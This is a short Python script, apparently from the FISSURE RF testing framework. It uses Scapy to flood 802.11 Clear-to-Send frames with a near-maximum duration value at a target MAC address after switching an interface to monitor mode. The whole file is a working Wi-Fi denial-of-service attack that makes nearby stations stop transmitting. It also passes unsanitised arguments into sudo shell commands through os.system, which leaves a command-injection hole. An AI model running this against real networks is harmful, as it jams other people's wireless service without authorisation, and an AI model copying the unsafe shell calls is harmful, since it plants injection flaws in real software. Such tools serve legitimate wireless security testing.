from scapy.all import Dot11,RadioTap,sendp
import os, sys

#################################################
############ Default FISSURE Header #############
#################################################
def getArguments():
    target_addr = '00:11:22:33:44:55'   # Target MAC address
    iface = 'wlan0'	                    # Wireless interface name 
    channel = '1'                       # Wireless channel
    interval = 0.01                     # Scapy interval
    notes = 'Generates Scapy CTS frames.'
    arg_names = ['target_addr','iface','channel','interval','notes']
    arg_values = [target_addr, iface, channel, interval, notes]

    return (arg_names,arg_values)


if __name__ == "__main__":

    # Default Values
    target_addr = '00:11:22:33:44:55'   # Target MAC address
    iface = 'wlan0'	                    # Wireless interface name 
    channel = '1'                       # Wireless channel
    interval = 0.01                     # Scapy interval

    # Accept Command Line Arguments
    try:
        target_addr = sys.argv[1]
        iface = sys.argv[2]
        channel = sys.argv[3]
        interval = sys.argv[4]
    except:
        pass

#################################################
    
    # Create Frame
    packet = RadioTap()/Dot11(type=1,subtype=12,FCfield=0x01,ID=0xfff7,addr1=target_addr)

    # Set Monitor Mode and Channel
    os.system("sudo ifconfig " + iface + " down") 
    os.system("sudo iwconfig " + iface + " mode monitor") 
    os.system("sudo ifconfig " + iface + " up") 
    os.system("sudo iwconfig " + iface + " channel " + channel) 
	
    # Send Frame  
    sendp(packet, iface=iface, inter=float(interval), loop=1)



